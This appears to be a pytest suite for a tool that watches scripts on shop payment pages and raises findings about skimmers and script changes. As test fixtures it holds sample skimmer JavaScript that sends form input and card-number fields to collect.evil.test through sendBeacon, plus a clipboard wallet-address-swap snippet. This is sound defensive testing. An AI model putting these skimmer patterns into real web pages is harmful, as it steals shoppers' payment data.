"""Findings raised by real scans, inline block identity, and the handling workflow."""

from __future__ import annotations

import uuid

import pytest
from sqlalchemy import select, update
from sqlalchemy.ext.asyncio import AsyncSession

from script_sentinel import audit, authorization, findings, scanner, sites, versions
from script_sentinel.db.models import (
    Finding,
    FindingKind,
    FindingStatus,
    PolicyKind,
    Scan,
    ScanTrigger,
    Script,
    ScriptKind,
    Severity,
)
from script_sentinel.fetch import PageFetcher
from script_sentinel.sites import NotFoundError, ValidationError
from tests.conftest import FixtureSite

WIDGET = b"(function(){var q=window.q=[];q.push('load');})();\n"


class Shop:
    """A payment page and a product page on the fixture site, with a vendor script on a CDN."""

    def __init__(self, site: FixtureSite, cdn: FixtureSite) -> None:
        self.site = site
        self.cdn = cdn
        self.vendor = cdn.url("/sdk/widget.js")
        self.set_vendor(WIDGET)
        self.set_checkout()
        self.site.page("/product", f'<script src="{self.vendor}"></script>')

    def set_vendor(self, body: bytes, path: str = "/sdk/widget.js") -> None:
        self.cdn.set(path, body, content_type="text/javascript")

    def set_checkout(self, *inline: str, srcs: tuple[str, ...] = ()) -> None:
        tags = "".join(f'<script src="{s}"></script>' for s in (self.vendor, *srcs))
        blocks = "".join(f"<script>{body}</script>" for body in inline or ("pay();",))
        self.site.page("/checkout", f"<html><head>{tags}{blocks}</head></html>")


@pytest.fixture
def shop(fixture_site: FixtureSite, cdn: FixtureSite) -> Shop:
    return Shop(fixture_site, cdn)


async def _register(session: AsyncSession, shop: Shop, *, product: bool = False) -> None:
    await sites.create_site(
        session, name="shop", allowed_origins=[shop.site.origin], scan_interval_hours=24
    )
    await sites.add_page(session, "shop", url=shop.site.url("/checkout"), payment_page=True)
    if product:
        await sites.add_page(session, "shop", url=shop.site.url("/product"))


async def _scan(session: AsyncSession) -> tuple[Scan, list[Finding]]:
    async with PageFetcher() as fetcher:
        scan = await scanner.scan_site(session, "shop", fetcher, trigger=ScanTrigger.CLI)
    await session.commit()
    return scan, await findings.scan_findings(session, scan.id)


async def _locators(session: AsyncSession) -> list[str]:
    return sorted(await session.scalars(select(Script.locator)))


async def test_the_first_scan_is_the_baseline(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop)
    scan, raised = await _scan(session)
    assert raised == []
    assert scan.findings_new == 0
    assert await findings.baseline_pages(session, uuid.uuid4()) == set()
    assert await findings.baseline_pages(session, scan.site_id) == {shop.site.url("/checkout")}


async def test_a_new_page_is_its_own_baseline(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop)
    await _scan(session)
    shop.site.page("/account", f'<script src="{shop.cdn.url("/sdk/acct.js")}"></script>')
    shop.set_vendor(b"acct();", "/sdk/acct.js")
    await sites.add_page(session, "shop", url=shop.site.url("/account"))
    # Its scripts are new to the inventory, but nobody had seen that page before.
    assert (await _scan(session))[1] == []
    shop.site.page(
        "/account",
        f'<script src="{shop.cdn.url("/sdk/acct.js")}"></script><script>late();</script>',
    )
    _, [added] = await _scan(session)
    assert added.locator == shop.site.url("/account#inline-1")


async def test_a_vendor_change_raises_a_finding_with_the_diff(
    session: AsyncSession, shop: Shop
) -> None:
    await _register(session, shop, product=True)
    await _scan(session)
    shop.set_vendor(
        WIDGET.replace(
            b"q.push('load');",
            b"q.push('load');document.addEventListener('change',function(e){"
            b"navigator.sendBeacon('https://collect.evil.test/c',e.target.value)});",
        )
    )
    scan, raised = await _scan(session)
    assert scan.findings_new == 1
    [finding] = raised
    assert finding.kind == FindingKind.SCRIPT_CHANGED
    assert finding.severity is Severity.CRITICAL  # new host, on a payment page
    assert finding.title == f"Script changed: {shop.vendor}"
    assert finding.locator == shop.vendor
    assert finding.scan_id == scan.id
    assert finding.status is FindingStatus.OPEN
    detail = finding.detail
    assert detail["reasons"] == [
        "the code changed",
        "references new hosts: collect.evil.test",
        "watches form input (change) and sends data to collect.evil.test",
        "runs on a payment page",
    ]
    assert [v["rule"] for v in detail["verdicts"]] == ["skimmer.form_data"]
    assert {(s["rule"], s["key"]) for s in detail["signals_added"]} == {
        ("collect.form_listener", "change"),
        ("exfil.beacon", "collect.evil.test"),
    }
    assert detail["pages"] == [shop.site.url("/checkout"), shop.site.url("/product")]
    assert detail["payment_page"] is True
    assert detail["hosts_added"] == ["collect.evil.test"]
    assert detail["urls_added"] == ["https://collect.evil.test/c"]
    assert detail["reverted"] is False
    assert detail["to_previously_approved"] is False
    assert detail["tokens"]["removed"] == 0
    [hunk] = detail["hunks"]
    assert hunk["added"].startswith("document . addEventListener")
    script = await versions.find_script(session, "shop", shop.vendor)
    history = (await versions.versions_by_script(session, [script.id]))[script.id]
    assert finding.version_id == history[0].id
    assert finding.previous_version_id == history[1].id
    assert detail["from_sha384"] == history[1].sha384


async def test_reformatting_reverting_and_failed_fetches(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop)
    await _scan(session)
    # Only comments and whitespace: info, never raised for the payment page.
    shop.set_vendor(b"/*! build 2 */\n" + WIDGET.replace(b";", b";   "))
    _, [reformatted] = await _scan(session)
    assert reformatted.kind == FindingKind.SCRIPT_REFORMATTED
    assert reformatted.severity is Severity.INFO
    assert reformatted.detail["reasons"] == ["only comments or whitespace changed"]
    assert reformatted.title.startswith("Script reformatted (same code)")
    # A real change, approved; then the vendor goes back to the first body.
    release = WIDGET.replace(b"'load'", b"'ready'")
    shop.set_vendor(release)
    await _scan(session)
    script = await versions.find_script(session, "shop", shop.vendor)
    await authorization.approve_script(
        session, "shop", script.id, actor="alice", justification="widget"
    )
    await session.commit()
    shop.set_vendor(WIDGET)
    _, [reverted] = await _scan(session)
    assert reverted.kind == FindingKind.SCRIPT_CHANGED
    assert reverted.detail["reverted"] is True
    assert reverted.severity is Severity.MEDIUM  # low, raised for the payment page
    assert reverted.title == f"Script went back to an earlier body: {shop.vendor}"
    # The same body again: nothing new.
    assert (await _scan(session))[1] == []
    # A failed fetch keeps the last bodies, so the next good fetch compares against them.
    shop.cdn.set("/sdk/widget.js", b"gone", status=503)
    assert (await _scan(session))[1] == []
    shop.set_vendor(release)
    _, [again] = await _scan(session)
    assert again.kind == FindingKind.SCRIPT_CHANGED
    assert again.detail["to_previously_approved"] is True
    assert [(h["removed"], h["added"]) for h in again.detail["hunks"]] == [("'load'", "'ready'")]


async def test_scripts_added_after_the_baseline(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop, product=True)
    await _scan(session)
    shop.set_vendor(b"track();", "/sdk/other.js")
    shop.site.set("/js/own.js", b"own();", content_type="text/javascript")
    shop.site.page(
        "/product",
        f'<script src="{shop.vendor}"></script><script src="{shop.cdn.url("/sdk/other.js")}">'
        f'</script><script src="/js/own.js"></script><script>hello("https://x.test/");</script>',
    )
    _, raised = await _scan(session)
    by_locator = {f.locator: f for f in raised}
    assert set(by_locator) == {
        shop.cdn.url("/sdk/other.js"),
        shop.site.url("/js/own.js"),
        shop.site.url("/product#inline-1"),
    }
    # The CDN host is known from the widget, the site's own origin is known: medium.
    other = by_locator[shop.cdn.url("/sdk/other.js")]
    assert (other.kind, other.severity) == (FindingKind.SCRIPT_ADDED, Severity.MEDIUM)
    assert other.title == f"New external script on 1 page(s): {shop.cdn.url('/sdk/other.js')}"
    assert by_locator[shop.site.url("/js/own.js")].severity is Severity.MEDIUM
    inline = by_locator[shop.site.url("/product#inline-1")]
    assert inline.severity is Severity.LOW
    assert inline.detail["hosts_referenced"] == ["x.test"]
    assert inline.detail["host"] is None
    # Most severe first.
    assert [f.severity for f in raised] == sorted(
        (f.severity for f in raised), key=list(Severity).index, reverse=True
    )


async def test_a_script_from_a_new_host_on_a_payment_page(
    session: AsyncSession, shop: Shop, fixture_site: FixtureSite
) -> None:
    await _register(session, shop)
    await _scan(session)
    # A third origin nobody has used: 127.0.0.1 is known, so use "localhost".
    port = shop.cdn.origin.rsplit(":", 1)[1]
    stranger = f"http://localhost:{port}/sdk/x.js"
    shop.set_vendor(b"x();", "/sdk/x.js")
    shop.set_checkout(srcs=(stranger,))
    _, [added] = await _scan(session)
    assert added.severity is Severity.CRITICAL
    assert added.detail["host"] == "localhost"
    assert added.detail["reasons"] == [
        "a new external script from a host no other uses",
        "runs on a payment page",
    ]
    assert added.title == f"New external script on a payment page: {stranger}"
    assert added.detail["sha384"]


async def test_failed_fetch_of_a_new_script_still_raises(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop)
    await _scan(session)
    missing = shop.cdn.url("/sdk/missing.js")
    shop.set_checkout(srcs=(missing,))
    _, [added] = await _scan(session)
    assert added.locator == missing
    assert added.version_id is None
    assert "sha384" not in added.detail


async def test_inserting_an_inline_block_keeps_identities(
    session: AsyncSession, shop: Shop
) -> None:
    await _register(session, shop)
    config = "window.config = {currency: 'EUR', locale: 'en-IE'};"
    layer = "window.dataLayer = []; dataLayer.push({page: 'checkout'});"
    shop.set_checkout(config, layer)
    await _scan(session)
    checkout = shop.site.url("/checkout")
    assert set(await _locators(session)) == {
        f"{checkout}#inline-1",
        f"{checkout}#inline-2",
        shop.vendor,
    }
    shop.set_checkout("window.abTest = 'B';", config, layer)
    _, raised = await _scan(session)
    # Without matching, inline-1 and -2 would both have "changed" and inline-3 be "new".
    assert [(f.kind, f.locator) for f in raised] == [
        (FindingKind.SCRIPT_ADDED, f"{checkout}#inline-3")
    ]
    # An edit in place stays the same script, with a diff.
    shop.set_checkout("window.abTest = 'B';", config, layer.replace("'checkout'", "'pay'"))
    _, [edited] = await _scan(session)
    assert (edited.kind, edited.locator) == (FindingKind.SCRIPT_CHANGED, f"{checkout}#inline-2")
    assert edited.severity is Severity.MEDIUM
    assert [(h["removed"], h["added"]) for h in edited.detail["hunks"]] == [("'checkout'", "'pay'")]


async def test_one_script_serving_two_bodies(session: AsyncSession, shop: Shop) -> None:
    """A query rule maps two URLs to one script; a change diffs against the closest body."""
    await _register(session, shop)
    await authorization.create_policy(
        session,
        "shop",
        kind=PolicyKind.ORIGIN,
        match=shop.cdn.origin,
        ignore_query=["v"],
        actor="test",
        justification="cache busters",
    )
    first = b"(function(){alpha(1);beta(2);gamma(3);})();"
    second = b"(function(){delta(4);epsilon(5);zeta(6);})();"
    shop.set_vendor(first, "/t.js?v=1")
    shop.set_vendor(second, "/t.js?v=2")
    shop.set_checkout(srcs=(shop.cdn.url("/t.js?v=1"), shop.cdn.url("/t.js?v=2")))
    await _scan(session)
    shop.set_vendor(second.replace(b"zeta(6)", b"zeta(7)"), "/t.js?v=2")
    _, [changed] = await _scan(session)
    assert changed.locator == shop.cdn.url("/t.js")
    assert [(h["removed"], h["added"]) for h in changed.detail["hunks"]] == [("6", "7")]


async def test_handling_a_finding(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop)
    await _scan(session)
    shop.set_vendor(WIDGET + b"more();")
    _, [finding] = await _scan(session)
    times = iter(range(100))

    def clock():  # type: ignore[no-untyped-def]
        from datetime import UTC, datetime, timedelta

        return datetime(2026, 11, 25, tzinfo=UTC) + timedelta(minutes=next(times))

    acked, site_name = await findings.set_status(
        session, finding.id, FindingStatus.ACKNOWLEDGED, actor="alice", clock=clock
    )
    assert site_name == "shop"
    assert (acked.status, acked.status_changed_by, acked.status_note) == (
        FindingStatus.ACKNOWLEDGED,
        "alice",
        None,
    )
    with pytest.raises(ValidationError, match="needs a note"):
        await findings.set_status(session, finding.id, FindingStatus.RESOLVED, actor="alice")
    with pytest.raises(ValidationError, match="at most"):
        await findings.set_status(
            session, finding.id, FindingStatus.RESOLVED, actor="alice", note="x" * 2001
        )
    with pytest.raises(ValidationError, match="actor"):
        await findings.set_status(session, finding.id, FindingStatus.OPEN, actor=" ")
    resolved, _ = await findings.set_status(
        session,
        finding.id,
        FindingStatus.RESOLVED,
        actor="bob",
        note="  Vendor release 2.4.2, reviewed  ",
        clock=clock,
    )
    assert resolved.resolved_at is not None
    assert resolved.status_note == "Vendor release 2.4.2, reviewed"
    with pytest.raises(ValidationError, match="resolved can't be acknowledged"):
        await findings.set_status(session, finding.id, FindingStatus.ACKNOWLEDGED, actor="bob")
    reopened, _ = await findings.set_status(
        session, finding.id, FindingStatus.OPEN, actor="carol", note="not the vendor"
    )
    assert reopened.resolved_at is None
    with pytest.raises(NotFoundError):
        await findings.set_status(session, uuid.uuid4(), FindingStatus.OPEN, actor="x")
    await session.commit()

    site = await sites.get_site(session, "shop")
    events = await audit.list_events(session, site.id, limit=3)
    assert [(e.action, e.actor, e.from_status, e.to_status) for e in events] == [
        ("finding.reopened", "carol", "resolved", "open"),
        ("finding.resolved", "bob", "acknowledged", "resolved"),
        ("finding.acknowledged", "alice", "open", "acknowledged"),
    ]
    assert events[1].reason == "Vendor release 2.4.2, reviewed"
    assert events[1].detail == {
        "finding_id": str(finding.id),
        "kind": "script.changed",
        "severity": "medium",
    }
    assert (await audit.verify_chain(session, site.id)).ok


async def test_listing_findings(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop, product=True)
    await _scan(session)
    shop.set_vendor(WIDGET + b"x();")
    shop.set_checkout("pay();", "extra();")
    scan, raised = await _scan(session)
    assert sorted(f.kind for f in raised) == [FindingKind.SCRIPT_ADDED, FindingKind.SCRIPT_CHANGED]
    every = await findings.list_findings(session, "shop")
    assert {f.id for f in every} == {f.id for f in raised}
    assert [f.severity for f in every] == [Severity.MEDIUM, Severity.MEDIUM]
    assert len(await findings.list_findings(session, "shop", limit=1)) == 1
    assert await findings.list_findings(session, "shop", min_severity=Severity.HIGH) == []
    assert len(await findings.list_findings(session, "shop", scan_id=scan.id)) == 2
    script = await versions.find_script(session, "shop", shop.vendor)
    [mine] = await findings.list_findings(session, "shop", script_id=script.id)
    assert mine.kind == FindingKind.SCRIPT_CHANGED
    await findings.set_status(session, mine.id, FindingStatus.ACKNOWLEDGED, actor="a")
    [left] = await findings.list_findings(session, "shop", status=FindingStatus.OPEN)
    assert left.kind == FindingKind.SCRIPT_ADDED
    found, name = await findings.get_finding(session, left.id)
    assert (found.id, name) == (left.id, "shop")
    with pytest.raises(NotFoundError):
        await findings.get_finding(session, uuid.uuid4())
    with pytest.raises(NotFoundError):
        await findings.list_findings(session, "nope")
    assert findings.worst(raised) is Severity.MEDIUM
    assert findings.worst([]) is None
    assert findings.any_at_least(raised, Severity.MEDIUM)
    assert not findings.any_at_least(raised, Severity.HIGH)


async def test_findings_outlive_their_script(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop)
    await _scan(session)
    shop.set_vendor(WIDGET + b"x();")
    _, [finding] = await _scan(session)
    finding_id = finding.id
    script = await versions.find_script(session, "shop", shop.vendor)
    await session.delete(script)
    await session.commit()
    session.expire_all()  # the database set the references to NULL
    kept, _ = await findings.get_finding(session, finding_id)
    assert kept.script_id is None
    assert kept.version_id is None
    assert kept.locator == shop.vendor


async def test_version_diffs(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop)
    await _scan(session)
    script = await versions.find_script(session, "shop", shop.vendor)
    with pytest.raises(ValidationError, match="only one version"):
        await versions.diff_versions(session, "shop", script.id)
    shop.set_vendor(WIDGET.replace(b"'load'", b"'ready'"))
    await _scan(session)
    shop.set_vendor(WIDGET.replace(b"'load'", b"'go'"))
    await _scan(session)
    history = (await versions.versions_by_script(session, [script.id]))[script.id]
    latest = await versions.diff_versions(session, "shop", script.id)
    assert (latest.old.id, latest.new.id) == (history[1].id, history[0].id)
    assert [(h.removed, h.added) for h in latest.analysis.diff.hunks] == [("'ready'", "'go'")]
    chosen = await versions.diff_versions(
        session, "shop", script.id, from_ref=history[2].sha384[:12], to_ref=str(history[1].id)
    )
    assert [(h.removed, h.added) for h in chosen.analysis.diff.hunks] == [("'load'", "'ready'")]
    backwards = await versions.diff_versions(
        session, "shop", script.id, to_ref=history[2].sha384[:8].upper()
    )
    assert backwards.old.id == history[0].id
    by_sri = await versions.diff_versions(
        session, "shop", script.id, from_ref=history[2].sri[:20], to_ref=history[1].sri
    )
    assert (by_sri.old.id, by_sri.new.id) == (history[2].id, history[1].id)
    with pytest.raises(ValidationError, match="not a version id"):
        await versions.diff_versions(session, "shop", script.id, from_ref="sha384-abc")
    with pytest.raises(ValidationError, match="not a version id"):
        await versions.diff_versions(session, "shop", script.id, from_ref="xyz")
    with pytest.raises(NotFoundError, match="no version"):
        await versions.diff_versions(session, "shop", script.id, from_ref="0" * 12)
    with pytest.raises(NotFoundError, match="no version"):
        await versions.diff_versions(session, "shop", script.id, from_ref=str(uuid.uuid4()))
    # An ambiguous prefix needs more characters.
    ambiguous = history[0].sha384[:8]
    for version in history[1:]:
        version.sha384 = ambiguous + version.sha384[8:]
    with pytest.raises(ValidationError, match="matches"):
        await versions.resolve_version(session, script, ambiguous)
    await session.rollback()


async def test_diffing_a_script_without_versions(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop)
    shop.cdn.set("/sdk/widget.js", b"nope", status=404)
    await _scan(session)
    script = await versions.find_script(session, "shop", shop.vendor)
    with pytest.raises(ValidationError, match="no versions yet"):
        await versions.diff_versions(session, "shop", script.id)
    with pytest.raises(ValidationError, match="no versions yet"):
        await versions.inspect_version(session, "shop", script.id)


async def test_inline_scripts_without_current_bodies_match_by_position(
    session: AsyncSession, shop: Shop
) -> None:
    """Inventories recorded before current bodies were tracked fall back to positions."""
    await _register(session, shop)
    shop.set_checkout("first();", "second();")
    await _scan(session)
    await session.execute(
        update(Script).where(Script.kind == ScriptKind.INLINE).values(current_version_ids=[])
    )
    await session.commit()
    shop.set_checkout("first(1);", "second();")
    _, raised = await _scan(session)
    # Nothing to compare with, so no change is reported, and no script is new.
    assert raised == []
    checkout = shop.site.url("/checkout")
    assert set(await _locators(session)) == {
        f"{checkout}#inline-1",
        f"{checkout}#inline-2",
        shop.vendor,
    }


# --- Skimmer heuristics in findings ------------------------------------------------------

SKIMMER = (
    b"(function(){var q=window.q=[];q.push('load');"
    b"document.addEventListener('submit',function(){"
    b"navigator.sendBeacon('https://collect.evil.test/c',"
    b"document.querySelector('#cc-number').value)});})();\n"
)


async def test_a_skimmer_on_the_first_scan_is_suspicious(session: AsyncSession, shop: Shop) -> None:
    shop.set_vendor(SKIMMER)
    await _register(session, shop, product=True)
    scan, raised = await _scan(session)
    # The page's first scan is still its baseline: only the flagged script is reported.
    assert scan.findings_new == 1
    [finding] = raised
    assert finding.kind == FindingKind.SCRIPT_SUSPICIOUS
    assert finding.severity is Severity.CRITICAL
    assert finding.title == f"Suspicious script on a payment page: {shop.vendor}"
    assert finding.previous_version_id is None
    detail = finding.detail
    assert detail["reasons"] == [
        "found on the page's first scan",
        "reads payment card fields (cc-number) and sends data to collect.evil.test",
        "watches form input (submit) and sends data to collect.evil.test",
        "runs on a payment page",
    ]
    assert [v["rule"] for v in detail["verdicts"]] == ["skimmer.card_data", "skimmer.form_data"]
    assert {s["rule"] for s in detail["signals"]} == {
        "collect.form_listener",
        "collect.card_field",
        "exfil.beacon",
    }
    assert detail["host"] == "127.0.0.1"
    assert detail["signals_truncated"] is False
    assert detail["hidden_hosts"] == []
    script = await versions.find_script(session, "shop", shop.vendor)
    assert script.current_version_ids == [str(finding.version_id)]
    # Nothing changes on the next scan: no new finding.
    assert (await _scan(session))[1] == []


async def test_a_flagged_script_that_isnt_high_stays_in_the_baseline(
    session: AsyncSession, shop: Shop
) -> None:
    # Hard-codes a wallet address (medium): worth a look, not worth breaking the baseline.
    shop.set_checkout('var tip = "0x1111111111111111111111111111111111111111";')
    shop.cdn.set("/sdk/widget.js", b"nope", status=404)  # and a body that never arrives
    await _register(session, shop)
    _, raised = await _scan(session)
    assert raised == []


async def test_new_scripts_carry_the_heuristics(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop, product=True)
    await _scan(session)
    swap = (
        'var mine = "0x1111111111111111111111111111111111111111";'
        "document.addEventListener('copy', function (e) {"
        "e.clipboardData.setData('text/plain', mine); e.preventDefault(); });"
    )
    shop.site.page("/product", f'<script src="{shop.vendor}"></script><script>{swap}</script>')
    _, [added] = await _scan(session)
    assert added.kind == FindingKind.SCRIPT_ADDED
    # A new inline script is low; the wallet swap pattern makes it high.
    assert added.severity is Severity.HIGH
    assert added.detail["reasons"] == [
        "a new inline script",
        "handles crypto wallet addresses and the clipboard, the pattern of "
        "address-swapping malware",
    ]
    assert [v["rule"] for v in added.detail["verdicts"]] == ["wallet.swap"]


async def test_first_party_destinations_are_not_exfiltration(
    session: AsyncSession, shop: Shop
) -> None:
    await _register(session, shop)
    await _scan(session)
    # Posting the card form to the site's own API, and to the script's own host, is normal.
    shop.set_vendor(
        WIDGET.replace(
            b"q.push('load');",
            b"q.push('load');fetch('" + shop.cdn.url("/tokens").encode() + b"',"
            b"{body:document.querySelector('#cc-number').value});",
        )
    )
    shop.set_checkout("pay();", "q('#cvv'); fetch('/api/pay', {method: 'POST'});")
    _, raised = await _scan(session)
    by_kind = {f.kind: f for f in raised}
    assert set(by_kind) == {FindingKind.SCRIPT_CHANGED, FindingKind.SCRIPT_ADDED}
    assert by_kind[FindingKind.SCRIPT_CHANGED].detail["verdicts"] == []
    assert by_kind[FindingKind.SCRIPT_ADDED].detail["verdicts"] == []


async def test_inspecting_a_stored_version(session: AsyncSession, shop: Shop) -> None:
    await _register(session, shop)
    await _scan(session)
    shop.set_vendor(SKIMMER)
    await _scan(session)
    script = await versions.find_script(session, "shop", shop.vendor)
    latest = await versions.inspect_version(session, "shop", script.id)
    assert [v.rule for v in latest.verdicts] == ["skimmer.card_data", "skimmer.form_data"]
    assert latest.context.script_host == "127.0.0.1"
    assert latest.context.site_hosts == {"127.0.0.1"}
    history = (await versions.versions_by_script(session, [script.id]))[script.id]
    assert latest.version.id == history[0].id
    first = await versions.inspect_version(session, "shop", script.id, ref=history[1].sha384[:10])
    assert (first.version.id, first.verdicts) == (history[1].id, [])
    # The diff of the two shows the same verdicts, as new behaviour.
    diff = await versions.diff_versions(session, "shop", script.id)
    assert [v.rule for v in diff.analysis.verdicts] == ["skimmer.card_data", "skimmer.form_data"]
